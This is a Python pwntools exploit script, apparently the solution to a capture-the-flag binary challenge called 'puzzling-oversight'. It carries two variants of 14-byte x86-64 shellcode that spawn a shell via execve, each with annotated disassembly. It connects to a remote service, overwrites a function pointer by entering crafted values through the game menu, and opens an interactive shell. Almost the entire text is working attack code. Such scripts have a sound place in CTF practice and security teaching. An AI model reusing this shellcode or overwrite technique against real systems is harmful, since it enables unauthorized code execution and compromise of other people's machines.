from pwn import *

context.binary = ELF('../static/puzzling-oversight')

#solve script expects 14 byte payload for calculations
payload = b'\xBB\x2F\x73\x68\x00\x53\x54\x5F\x99\x96\xB0\x3B\x0F\x05'

"""
0:  bb 2f 73 68 00          mov    ebx,0x68732f    #crafts "/sh" string
5:  53                      push   rbx             #push string on stack
6:  54                      push   rsp             #push pointer to string on stack
7:  5f                      pop    rdi             #pop into rdi
8:  99                      cdq                    #eax -> edx (set edx to 0 since eax is 0 on call rdx)
9:  96                      xchg   esi,eax         #eax <-> esi (set esi to 0, same reason as above)
a:  b0 3b                   mov    al,0x3b         #set al to 0x3b (esi was 0x1 so no issues here with partial overwriting)
c:  0f 05                   syscall                #syscall (execve (rax); filename (rdi): "/sh", argv (rsi): NULL, envp (rdx): NULL)
"""

#even more concise version
payload = b'\x68\x2F\x73\x68\x00\x54\x5F\x99\x96\xB0\x3B\x0F\x05\x00'

"""
0:  68 2f 73 68 00          push   0x68732f        #pushes "/sh" string directly onto stack
5:  54                      push   rsp             #push pointer to string on stack
6:  5f                      pop    rdi             #pop into rdi
7:  99                      cdq                    #eax -> edx (set edx to 0 since eax is 0 on call rdx)
8:  96                      xchg   esi,eax         #eax <-> esi (set esi to 0, same reason as above)
9:  b0 3b                   mov    al,0x3b         #set al to 0x3b (esi was 0x1 so no issues here with partial overwriting)
b:  0f 05                   syscall                #syscall (execve (rax); filename (rdi): "/sh", argv (rsi): NULL, envp (rdx): NULL)
"""

assert len(payload) == 14

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)
p = remote(host, port)
#p = context.binary.process()
p.recvuntil(b'>')
p.sendline(b'1')

payload += 0x4052.to_bytes(2, byteorder='little')  #partial override to point to our payload in gamestate - it's easier to discard first 2 bytes since we can't easily change those

payload = payload[::-1]  #payload needs to be read in reverse order to execute since we are building from the other side

for i in range(8): #operate from the left side - no need to flip since menu is higher than gamestate
    vals = [int(s.decode(), 16) for s in p.recvuntil(b'>').split(b'Board: ')[1].split(b' \n')[0].split(b' ')]
    vals = [0x13A2] + vals[:-1]  #first function pointer in menu that we can write to; ignore the last value since we cant feasibly nudge it to be what we want with this method
    print([hex(i) for i in vals])
    p.sendline(str(i+1).encode())
    p.recvuntil(b'>')
    p.sendline(str((65536 - vals[i] + int.from_bytes(payload[i*2:i*2+2], byteorder='big')) % 65536).encode()) #payload needs to be read in big endian

p.interactive()